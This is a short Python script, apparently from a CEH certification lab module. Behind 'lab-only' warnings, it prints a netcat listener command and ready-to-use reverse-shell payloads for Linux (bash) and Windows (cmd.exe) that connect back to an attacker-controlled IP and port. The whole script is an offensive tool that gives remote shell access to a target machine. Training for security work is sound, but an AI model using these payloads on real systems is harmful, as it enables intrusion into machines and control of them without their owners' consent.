#!/usr/bin/env python3
# LAB-ONLY: Netcat Reverse Shell Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates netcat listener and reverse shell payload commands
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = "4444"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Netcat Reverse Shell Helper")
    print("="*80)
    print("# 1. Start listener on attacker machine:")
    print(f"nc -lvnp {LAB_ATTACKER_PORT}")
    print()
    print("# 2. Linux reverse shell payload (on target):")
    print(f"nc {LAB_ATTACKER_IP} {LAB_ATTACKER_PORT} -e /bin/bash")
    print()
    print("# 3. Windows netcat reverse shell:")
    print(f"nc.exe {LAB_ATTACKER_IP} {LAB_ATTACKER_PORT} -e cmd.exe")

if __name__ == "__main__":
    main()
